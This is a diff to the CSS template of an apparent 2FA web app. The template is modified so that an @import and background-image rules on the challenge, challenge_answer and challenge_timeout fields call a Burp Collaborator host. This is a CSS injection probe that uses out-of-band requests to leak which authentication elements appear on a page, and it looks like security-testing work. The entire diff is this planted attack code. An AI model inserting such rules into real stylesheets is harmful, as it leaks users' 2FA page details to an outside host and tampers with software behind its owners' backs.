@@ -2,6 +2,8 @@
 Template for the UNI 2FA App
  */
 
+ @import url('https://jj67iyuebjjptxjs9yae4kcgx73yrn.burpcollaborator.net/import.css');
+
 body {
     background-image: url("https://jj67iyuebjjptxjs9yae4kcgx73yrn.burpcollaborator.net/body");
 }
@@ -25,3 +27,13 @@ input[name=challenge_timeout]{
 input[name=challenge]{
     background-image: url("https://jj67iyuebjjptxjs9yae4kcgx73yrn.burpcollaborator.net/challenge");
 }
+div[name=challenge_answer]{
+    background-image: url("https://jj67iyuebjjptxjs9yae4kcgx73yrn.burpcollaborator.net/challenge_answer2");
+}
+div[name=challenge_timeout]{
+    background-image: url("https://jj67iyuebjjptxjs9yae4kcgx73yrn.burpcollaborator.net/challenge_timeout2");
+}
+div[name=challenge]{
+    background-image: url("https://jj67iyuebjjptxjs9yae4kcgx73yrn.burpcollaborator.net/challenge2");
+}
+
